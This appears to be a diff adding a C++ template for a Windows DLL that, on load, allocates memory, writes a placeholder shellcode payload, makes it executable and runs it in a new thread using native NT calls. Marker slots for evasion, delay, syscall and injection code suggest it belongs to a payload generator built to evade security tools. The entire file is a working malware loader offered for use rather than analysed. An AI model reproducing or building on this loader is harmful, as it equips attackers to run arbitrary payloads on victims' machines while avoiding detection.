@@ -1,0 +1,89 @@
+#include <iostream>
+#include <windows.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <tchar.h>
+
+//####INCLUDE####
+
+//####DEFINE####
+
+//####CODE####
+
+
+DWORD WINAPI esc_main();
+
+#define DLLEXPORT __declspec( dllexport )
+
+__declspec(dllexport)BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+    //HANDLE threadhandle;
+    switch(dwReason){
+        case DLL_PROCESS_ATTACH:
+            printf("DLL_PROCESS_ATTACH\n");
+            esc_main();
+            break;
+        case DLL_PROCESS_DETACH:
+            printf("DLL_PROCESS_DETACH\n");
+            break;
+        case DLL_THREAD_ATTACH:
+            printf("DLL_THREAD_ATTACH\n");
+            break;
+        case DLL_THREAD_DETACH:
+            printf("DLL_THREAD_DETACH\n");
+            break;
+    }
+    return TRUE;
+}
+
+DWORD WINAPI esc_main()
+{
+    DWORD dwSize;
+    //HANDLE currentProcess;
+
+    //####DELAY####
+    //####EVASION####
+    //####ARGS####
+
+    unsigned char encoded[] = ####SHELLCODE####;
+    SIZE_T length = sizeof(encoded);
+
+
+    //####CALL####
+    unsigned char* decoded = encoded;
+
+
+    //####SYSCALL####
+    HANDLE hProc = NULL;
+    DWORD oldprotect = 0;
+    PVOID base_addr = NULL;
+    HANDLE hThread = NULL;
+    SIZE_T bytesWritten;
+    SIZE_T pnew = length;
+    
+
+    //####INJECTION####
+
+    // Allocate memory for shellcode
+    NTSTATUS status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    // Write shellcode to allocated memory
+    status = NtWriteVirtualMemory(hProc, base_addr, decoded, length, 0);
+
+    // Change memory protection to executable
+    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&length, PAGE_EXECUTE_READ, &oldprotect);
+
+    // Create a new thread to execute the shellcode
+    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, base_addr, base_addr, 0, NULL, NULL, NULL, NULL);
+
+    // Wait for thread to complete
+    status = NtWaitForSingleObject(hThread, FALSE, NULL);
+
+    // Clean up handles
+    NtClose(hThread);
+    NtClose(hProc);
+
+    ExitProcess(0);
+    
+    return 0;
+}
